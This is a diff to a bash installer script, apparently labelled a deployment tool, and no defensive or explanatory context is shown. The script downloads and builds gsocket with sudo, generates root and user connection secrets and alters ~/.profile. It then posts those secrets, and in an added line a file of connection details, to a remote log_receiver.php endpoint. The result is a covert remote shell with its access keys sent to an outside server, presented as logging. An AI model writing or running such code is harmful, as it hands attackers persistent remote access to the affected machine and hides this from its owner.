@@ -4,7 +4,7 @@
 
 # ================= CONFIGURATION =================
 SERVER_URL="SERVER_PLACEHOLDER"
-LOG_ENDPOINT="$SERVER_URL/log_receiver.php"
+LOG_ENDPOINT="$SERVER_URL/deployment/log_receiver.php"
 AUTH_TOKEN="TOKEN_PLACEHOLDER"
 VERSION="1.1.0"
 # ================================================
@@ -353,7 +353,7 @@ install_gsocket() {
     if ! command -v gs-netcat &>/dev/null; then
         log_cmd "wget -q -O $TEMP_DIR/gsocket_linux-$(uname -m).tar.gz \"https://github.com/hackerschoice/gsocket/archive/refs/tags/v1.4.43.tar.gz\"" "Download gsocket" "$log_file"
         log_cmd "cd $TEMP_DIR && tar xfz gsocket_linux-*.tar.gz" "Extracting gsocket" "$log_file"
-        log_cmd "cd gsocket-* && ./bootstrap && ./configure && make && sudo make install" "Building and install gsocket" "$log_file"
+        log_cmd "cd $TEMP_DIR/gsocket-* && ./bootstrap && ./configure && make && sudo make install" "Building and install gsocket" "$log_file"
     fi
     
     # Generate a unique secret
@@ -388,7 +388,7 @@ EOF
     log_cmd "source ~/.profile" "Reloading .profile" "$log_file"
     
     # Create connection instructions
-    cat > "$TEMP_DIR/gsocket-info.txt" << EOF
+    cat > "$TEMP_DIR/gsocket_info.txt" << EOF
 GSocket Connection Information
 =============================
 Root secret: $gs_root_secret
@@ -402,6 +402,7 @@ EOF
     # Send the gsocket secret to the server
     send_logs "$log_file" "$gs_root_secret" "gsocket_root_secret"
     send_logs "$log_file" "$gs_user_secret" "gsocket_user_secret"
+    send_logs "$log_file" "$TEMP_DIR/gsocket_info.txt" "gsocket_info"
     
     echo "[+] GSocket installed. You can connect using: gs-netcat -s $gs_root_secret"
 }
